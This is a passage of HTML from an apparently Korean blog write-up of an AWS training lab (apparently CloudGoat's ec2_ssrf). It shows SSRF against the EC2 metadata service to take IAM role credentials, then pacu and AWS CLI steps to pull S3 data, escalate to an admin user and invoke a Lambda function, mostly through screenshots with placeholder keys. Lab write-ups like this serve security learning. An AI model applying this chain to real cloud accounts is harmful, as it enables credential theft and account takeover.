720w,\n/static/1285c66d47051286d1f7a3e4c4e94476/302a4/14.png 1080w,\n/static/1285c66d47051286d1f7a3e4c4e94476/663b1/14.png 1313w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>확인한 결과 출력되는 값에는 해당 인스턴스의 환경 정보들을 확인할 수 있었습니다.</li>\n<li>이를 바탕으로 애플리케이션은 SSRF에 취약하고 EC2 인스턴스에 있기 때문에 IMDSv1을 활용하여 IAM Rule credentials을 탈취할 것입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7ElEQVQY042M7UqDYBiGPS5fPybqGLEW1I/OdEvGQnYI26vrCNoEbSo2dbqu8G1EBEE3XDz3Bzya70+wbQfLsvE8F8cZYVoOo5GDEAa6biCEwDAEhmnjuR5j32c6veXhbsaNO0EXFqYYM7t/RFsul4RhyGLxxPNqRRAEzOcL1us1u90LUkZE0YAkkpHKcshxzFb5mM1WslGbRNvvXzkcEo5vR9I0JcsykiShLAryouBcFFCWMNyBPL/6azdsVQXll9eqqqJpGtq2peu6b/q+V33XtlzaM5fzD1T3i6ZRVxsevZ9O1HXNX/rg//oEZddRvx9AG8UAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"15\"\n        title=\"15\"\n        src=\"/static/8a68fc9aa7b7d7763976cb0ee89306cf/37523/15.png\"\n        srcset=\"/static/8a68fc9aa7b7d7763976cb0ee89306cf/e9ff0/15.png 180w,\n/static/8a68fc9aa7b7d7763976cb0ee89306cf/f21e7/15.png 360w,\n/static/8a68fc9aa7b7d7763976cb0ee89306cf/37523/15.png 720w,\n/static/8a68fc9aa7b7d7763976cb0ee89306cf/302a4/15.png 1080w,\n/static/8a68fc9aa7b7d7763976cb0ee89306cf/d4e7f/15.png 1416w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\">cg<span class=\"token operator\">-</span>ec2<span class=\"token operator\">-</span>role<span class=\"token operator\">-</span>ec2_ssrf_cgid84kpkl3ssy</code></pre></div>\n<ul>\n<li>해당 Security-credential 정보를 확인할 수 있고</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABRUlEQVQY0z2O707iQBRH+1aaLNSFokTMRuN+2Xc1SiPu+gh2pnzwT6MUaGc6AaHTaY+hLN7k5HfuvbnJ9c7ORgTBAN//yelgQBD06XRP6PV3M58fHZ+u32290+nS6w04Hw4ZjS64/n3N1fCCfnDK8dEJvy7/4N2GIX8f/3E7HnM/mXAXhtzcjQknD8g4ZjqdEktBLASxlEghESJqXUQRQkqiSPC0cyHw5nHMu5QsX15a8tc30ihCPz+TJgmLNAWt9xQFKLXHmH1/4H95TZ5TK0VtDI0xOKWo0jlNlmMWC5TWuLLEWUtVli2u3HttLY1zNFVFU9c0DXjJx4z32YzXJGnzI02ZZxnFaoUuCowxKKValsslWZaRK0WW5+1us93wudmy2W5Zr9d4xe6oKNBas16tsKXF7j6pqm+cc9954LCz1rYc/AtX5ZxkZe5/5gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"16\"\n        title=\"16\"\n        src=\"/static/c969fcc59e84528c37b53d74dacc7fa5/37523/16.png\"\n        srcset=\"/static/c969fcc59e84528c37b53d74dacc7fa5/e9ff0/16.png 180w,\n/static/c969fcc59e84528c37b53d74dacc7fa5/f21e7/16.png 360w,\n/static/c969fcc59e84528c37b53d74dacc7fa5/37523/16.png 720w,\n/static/c969fcc59e84528c37b53d74dacc7fa5/302a4/16.png 1080w,\n/static/c969fcc59e84528c37b53d74dacc7fa5/07a9c/16.png 1440w,\n/static/c969fcc59e84528c37b53d74dacc7fa5/ab3e6/16.png 1441w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token punctuation\">{</span> <span class=\"token string-property property\">\"Code\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"Success\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string-property property\">\"LastUpdated\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"2021-08-13T12:26:30Z\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string-property property\">\"Type\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"AWS-HMAC\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string-property property\">\"AccessKeyId\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;ACCESS_KEY>\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string-property property\">\"SecretAccessKey\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;ACCESS_SECRET_KEY>\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string-property property\">\"Token\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;ACCESS_SESSION_KEY>\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string-property property\">\"Expiration\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"2021-08-13T18:44:43Z\"</span> <span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>탈취한 IAM Rule Credential 은 다른 IAM Credential 처럼 사용이 가능합니다. 이를 이용하여 Rule Credential을 사용하여 수행할 수 있는 작업을 열거하기 위해 AWS CLI를 사용하여 새로운 프로필을 생성하지만 IAM Rule Credential 은 Life-cycle이 짧은 Session_token이 있습니다.</li>\n<li>이를 통해 새롭게 추가를 하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABSklEQVQoz01Rx07DUBC0hIAUcUFKg5BeSHHv9vNzidMDR/7/TwbtBkscRvtmvTNbrKw2PjQjxkYNsdVCLD4duH6BJL0giPZIixtUPcZy7WKrRQzDlpjMDHR6c0arO0P3bYHmSw+KF5SQ2RUivXBM8xuEPCNOTojEkd+hOHID+k75rPhClJyY5+U3a87XH4wm2t2QRDK/sZDeXnjPhfGBDSiSITWgqWV+RRAd2JC4H5ZszIa0qmlLFtleDsvJ4Hg5w/V3nNcMActJYbs5dFNwjRfsYFiSoVsJDCvh9RXdTLiABI5f8P2omGDaKRveeclrVhP9R1XXH6yhkBmNTuvE8sz3ICGtKP44mRAsN2P40R6OV3CsmpNh730JpT9SMZ0b/NcGYxXDsYrBaIvxVOebUPwYblBvdlBrtPFcb6PW6OCp3uJYccLD4yt+AdIv4eyjb4PgAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"17\"\n        title=\"17\"\n        src=\"/static/aee959fcd1bf72b65d53331875925a09/37523/17.png\"\n        srcset=\"/static/aee959fcd1bf72b65d53331875925a09/e9ff0/17.png 180w,\n/static/aee959fcd1bf72b65d53331875925a09/f21e7/17.png 360w,\n/static/aee959fcd1bf72b65d53331875925a09/37523/17.png 720w,\n/static/aee959fcd1bf72b65d53331875925a09/5a190/17.png 800w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABP0lEQVQY0zWR127CQBBFV1FEKC6AcbdxwWDcCzWUJIT3/P/f3GgmytNopdkzZ+6INDsgK06o2yuq5oK2v2ObH6FbCWTVg+NnkBQXurmCbiaY6xHmiwgLYwVJcaDpMUx7jYUR421kQBzOT4bk5Ql5dUZZv2O17tB0dyRpj8fzB8uwRNPdUHc3JJse3e4D+9M3/KDARHagTH3IqovBUIcg2O74QNVcGVK3N6zTHYrqjGTTod9/QZ0tEcY1W5Op420ZRoMsJ4WmR7DdFGPJhiAYQf4b4qTlFbxlzutkxZEhZEtQMqTeIK757QUFV4KyIWXX7T9BWZb1hdedaSFbzLSAbWmAH5Y8kD4zMKrg+hkMK2E7ypCBtrv9C3sRshHVsWRxLqOJyQd4HWhQph4fiYbRatQ3HJsQQoIQMsSLCkl28Au8Q6ZZWzMSxgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"18\"\n        title=\"18\"\n        src=\"/static/3aa8dc79569ae66f55effc728f5e262e/37523/18.png\"\n        srcset=\"/static/3aa8dc79569ae66f55effc728f5e262e/e9ff0/18.png 180w,\n/static/3aa8dc79569ae66f55effc728f5e262e/f21e7/18.png 360w,\n/static/3aa8dc79569ae66f55effc728f5e262e/37523/18.png 720w,\n/static/3aa8dc79569ae66f55effc728f5e262e/764be/18.png 806w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>탈취한 IAM AWS Credential 정보를 통해서 사용가능한 나열을 하여 <code class=\"language-text\">s3.list_buckets</code> 작업이 작동 중인 것을 확인할 수 있습니다.</li>\n</ul>\n<h3 id=\"s3-bucket내에서-데이터-및-credential-분석-추출-및-함수-호출\" style=\"position:relative;\"><a href=\"#s3-bucket%EB%82%B4%EC%97%90%EC%84%9C-%EB%8D%B0%EC%9D%B4%ED%84%B0-%EB%B0%8F-credential-%EB%B6%84%EC%84%9D-%EC%B6%94%EC%B6%9C-%EB%B0%8F-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C\" aria-label=\"s3 bucket내에서 데이터 및 credential 분석 추출 및 함수 호출 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>S3 Bucket내에서 데이터 및 Credential 분석, 추출 및 함수 호출</h3>\n<ul>\n<li>S3가 작동중이니 해당 데이터를 pacu 도구를 통해 다운로드를 받아봤습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABCElEQVQY00VQ23KCUAw81VpLEUTkcLUtKjcFOSJqtfX2/z+1ncSpfdhJsjPZZFe4fgLbmcJxZ/DDDEGUwwsySD+B9BLmdSOEab3Dsj8gvTlztKfpHoQwIDpDPHUtdJ5HEKo5Y705o2kvqNQ3ytUBzfYK4lVzQjyroZsh+prE2yBgaLoP05pAN/7nXt9hUbEov9Dubthsb1i3FxaoahI+ol6fuNLBfLHDPG2wUj/Iii1G45idhZOCHQ2G0V2wqo+8RJ8tqwPbpjpNFOhYUe5RLPfcx/Oa+zRv4QYpXD9l+8Ywgu3E6PZsiM/pCl6QPvKj1wdmxP1Y3rMlkDXK6A8vr/IB2iFulij8Ap1uhn/lWPdEAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"19\"\n        title=\"19\"\n        src=\"/static/173582a0bb77b091ca38005598e4f277/37523/19.png\"\n        srcset=\"/static/173582a0bb77b091ca38005598e4f277/e9ff0/19.png 180w,\n/static/173582a0bb77b091ca38005598e4f277/f21e7/19.png 360w,\n/static/173582a0bb77b091ca38005598e4f277/37523/19.png 720w,\n/static/173582a0bb77b091ca38005598e4f277/d48f1/19.png 796w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/UlEQVQY0zXIXU+CYABAYS4S+ZC8UAnL1BTlRUBAhCibtqk1t9RWq7ytLvr/v+C0cF2cPduRng8ZyTQljK6L8myGyJdo9+/YIsT3JwyGAX3bY+TFOH8vSBiHKX4w5arn4vkJk+QGz0+RDt8Zs/mCcXRHfrtiKBIuuz5tO8Zs2hjVCxTV5ESuISt1SuV6oVw+9v/LagNZaSB9/Xyw27+w27+xenhi87glW+9pbT/JZ0vmizXuKKbTdRg6IfbAR7gRI2+CcGPaHQdHRARhiiNipPVrjZ7dR9MtVN1E1RrIuoVUaVFS6qiaeUw/QzcstIqFbjSpnDYLFc0sNKrnhb9UA3KgML3qcwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"20\"\n        title=\"20\"\n        src=\"/static/7ee8adaf0f3554c4735199dc745bf14e/37523/20.png\"\n        srcset=\"/static/7ee8adaf0f3554c4735199dc745bf14e/e9ff0/20.png 180w,\n/static/7ee8adaf0f3554c4735199dc745bf14e/f21e7/20.png 360w,\n/static/7ee8adaf0f3554c4735199dc745bf14e/37523/20.png 720w,\n/static/7ee8adaf0f3554c4735199dc745bf14e/321ea/20.png 786w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다운 받은 데이터를 통해 AWS Credential 값이 들어 있는 것을 확인할 수 있습니다. 또 똑같이 해당 데이터를 통해 새로운 프로필을 만들어 보겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAABCElEQVQY0x2Py26CUAAFSZriI9ZYAR+JRkEQ2wuCgnilD63VxorWdOum+3bZTf9+GlmcZM7sRvn+zdgf9my2R952H5wOn3inL/zszOH9yHyxYuiOGQcJwo8JwjnhROau13cRfoTrzkhfu7TNCsrpPGYSz3CGEcKXBJNHRp4kiJbIdEOcvCDTLY475U4kWHaYc7PtUK60UYs6atFALdW5UmsolrkkCJ+JkxXRbEUi19hCUtVNGs0BmmGiGX3qei/nW62H3rAwmhbVWodCyaBQalC+0bgu1lB+/lJ2+w1x/EQ4XRCFCa00oyoeGFojBo5Hp2szsAWmdZ+nXnb5ebI3xXVjFusurX6Ff5N8eEHaoPHWAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"21\"\n        title=\"21\"\n        src=\"/static/21d271ba88988668a39050deac212694/37523/21.png\"\n        srcset=\"/static/21d271ba88988668a39050deac212694/e9ff0/21.png 180w,\n/static/21d271ba88988668a39050deac212694/f21e7/21.png 360w,\n/static/21d271ba88988668a39050deac212694/37523/21.png 720w,\n/static/21d271ba88988668a39050deac212694/5a6dd/21.png 802w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>생성된 프로파일에 기반하여 어떤 유저에게 속하는지를 파악하기 위해 <code class=\"language-text\">get-caller-identity</code> cmd를 이용하여 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/klEQVQY0y3IzVKCUABA4ZvTxhHUbFJTkRDl55IXBBG0i5pa06ZpV/sewCfo3U8z2eJbnCPevyTnnxX745os0+RFxabcYp0+ccoXdvqZJC1ZpCXleke+qtDVEV2dyFeaJ31AV2+khURtDITZMXH8ASPbw2haOG6M7Sj8ySOjoYfRshCiiai1L65aF7U2tevO/2siRAMhbhBCdOn3MtxphuMqkrRCxRuibI89WzC2Jd3+lKEV0h/M6N1P/3r8EDEaX1690aNu3FE324jXD8n3eYneFsxVgR8khL7CTA7cBjkyiHFncybTCM9XeEFMKBfIKGXiSvwwJgiWqDRA5ga/NKJzgtgGeE0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"22\"\n        title=\"22\"\n        src=\"/static/7c58cf47ade67b836bb57c305199ba6c/37523/22.png\"\n        srcset=\"/static/7c58cf47ade67b836bb57c305199ba6c/e9ff0/22.png 180w,\n/static/7c58cf47ade67b836bb57c305199ba6c/f21e7/22.png 360w,\n/static/7c58cf47ade67b836bb57c305199ba6c/37523/22.png 720w,\n/static/7c58cf47ade67b836bb57c305199ba6c/d2a60/22.png 807w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>확인한 결과 <code class=\"language-text\">shepard</code> 유저에게 참조가 되고 있고 이에 대한 정책을 식별해봤습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABYklEQVQY0z2Ny27TQABFp6UP2zO248TjsR2/4ziBtIEmKVHaJhKtUAtrKliw5wP4fx1UK2JxdHSlq3vF39tXfm6+sdru2R++8uXwxPzlF83umbvtnpv1HVfLW9abez5vD33nZrVjtd7x8PDM08s9P/4kvP7O+F58QuRewzRfUk0+khULTDrDlQYhHITwjqij3SMe4sRHnPqcnI4QIkKIIeJsgBBnPue2JhiWlPU1Jm7xgoJ4PMMkU+K0Ix53aDMhyWbk5YIobrGl4cLSXNghlgxRnuHS0ghHJf3TpR2hTYs3yPH9MTpqCEYVYTTBJF3vkW76sTf8oMD1M1w/R6qSUdgh3TEi1DWhrlBegnRjXDfmPCh556ZIGWE5useWEY40OMr0+c3KS/GCCFModKaw5BAxaa9p2iuKat67bT4wmG/x6yV1OSPNpoyzKVnRUVTvqZvF/1w3S9p5w+ZRsToM0HHKP/cnnvxZaZ68AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"23\"\n        title=\"23\"\n        src=\"/static/32937540cf21217bb12edaea733c17e5/37523/23.png\"\n        srcset=\"/static/32937540cf21217bb12edaea733c17e5/e9ff0/23.png 180w,\n/static/32937540cf21217bb12edaea733c17e5/f21e7/23.png 360w,\n/static/32937540cf21217bb12edaea733c17e5/37523/23.png 720w,\n/static/32937540cf21217bb12edaea733c17e5/6c745/23.png 893w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>IAM 사용자 <code class=\"language-text\">shepard-ec2_ssrf_cgid84kpkl3ssy</code> 에 연결된 정책에 대한 권한을 확인하여 다음 공격 방향을 잡았습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABfElEQVQoz32Re2+iQBTFR0AqdJXX8qgpFKGtG3k4DCqotNmN6W7ST9Dv/0VOw602tmn3j9/cmblzTk7usPS2gKg71OsHtLsDOG+x2P1FxB9RVVtkxQZF2WBZ7VDVHbb7Azbtb3rPRYeCV+j+zbB/ihHGCdhI9xFM51jkLeKkhD6eQtc86JoLWXWgjjxolwEuNJ+q/uOKuBxPIQ1tMDYBY/YbAxNsIBkYyCb8qzvk5RZecAvHSzCxIiiqDSYZXzOYkE4eWpCHJiEpFli/9I2+mnaE8CaD66e4jjJYTkzivvcdJ+0Jdn7B2BizdIn7XysyNqzog+Fn8Ve8GyqqQ1UduejnejI453sj80gfSjJwoXmUKk5LmuXEDGnw8tB+57/J5CO9oUI/6SK8yRHFObzgDtNwQThuQueffgpJOX6QbIJJZ1B6g6De/Zxj03QoCoFKNBC8RtL8QSAeUZUCWV5hkS1RlAKcryHqhvZ5wbFa7bFuOZ5fXDy/eEjnM7wCrVzgKjXUn00AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"24\"\n        title=\"24\"\n        src=\"/static/bf629f8da8995bf1bc126f73f5159b2a/37523/24.png\"\n        srcset=\"/static/bf629f8da8995bf1bc126f73f5159b2a/e9ff0/24.png 180w,\n/static/bf629f8da8995bf1bc126f73f5159b2a/f21e7/24.png 360w,\n/static/bf629f8da8995bf1bc126f73f5159b2a/37523/24.png 720w,\n/static/bf629f8da8995bf1bc126f73f5159b2a/38af3/24.png 894w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>예상데로 IAM 사용자 “shepard”로서 AWS 계정에 대한 관리자 접근 권한을 갖고 있었습니다. 해당 AWS Credential을 사용하여 <code class=\"language-text\">cg-lambda-ec2_ssrf_cgid84kpkl3ssy</code> Lambda 함수를 호출하겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyklEQVQI1yWJbU+CUACF2QKVV+2C4BWsrVJhs5nYTCE3Fco1x9b8yB/p5z+t24ez5zznaD9lS7tteC0P1B8N1fHMor6Snb75rL5Yb/as8oJdcWRXnijKSvX3fc3m7cBylXNpx5yvE5rpC9q8P+MpypCTjHGcIpOUwSBBiDv64h6jG6B3fDq9oeKNIdT25/9fgG5IDEOid4doloh5THMWz1vm2Zo4mSEflnijKT0zwHIiTDtUtN2RimlHmFaI7UocL8KXLrehh+X4/ALlAlO/Mq6T4wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"25\"\n        title=\"25\"\n        src=\"/static/41c4a57f52899f40ba91e0f426bfc3c3/37523/25.png\"\n        srcset=\"/static/41c4a57f52899f40ba91e0f426bfc3c3/e9ff0/25.png 180w,\n/static/41c4a57f52899f40ba91e0f426bfc3c3/f21e7/25.png 360w,\n/static/41c4a57f52899f40ba91e0f426bfc3c3/37523/25.png 720w,\n/static/41c4a57f52899f40ba91e0f426bfc3c3/eac55/25.png 887w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 흐름도</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\">시나리오 환경설정</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#solus-key-%EC%A0%95%EB%B3%B4%EB%A5%BC-%EC%9D%BD%EA%B8%B0%EC%A0%84%EC%9A%A9%EC%9D%84-%EC%A0%91%EA%B7%BC\">Solus key 정보를 읽기전용을 접근</a></li>\n<li><a href=\"#lambda-%ED%99%98%EA%B2%BD-%EB%B3%80%EC%88%98-%EB%8D%B0%EC%9D%B4%ED%84%B0-%ED%99%95%EC%9D%B8\">Lambda 환경 변수 데이터 확인</a></li>\n<li><a href=\"#lambda-%EA%B8%B0%EB%8A%A5-%EB%82%98%EC%97%B4-%EB%B0%8F-%EB%B6%84%EC%84%9D\">Lambda 기능 나열 및 분석</a></li>\n<li><a href=\"#ec2-%EB%82%B4%EC%97%90%EC%84%9C-%EB%8F%99%EC%9E%91%EC%A4%91%EC%9D%B8-%EC%9B%B9-%EC%84%9C%EB%B9%84%EC%8A%A4-%ED%8C%8C%EC%95%85-%EB%B0%8F-%EB%B6%84%EC%84%9D\">EC2 내에서 동작중인 웹 서비스 파악 및 분석</a></li>\n<li><a 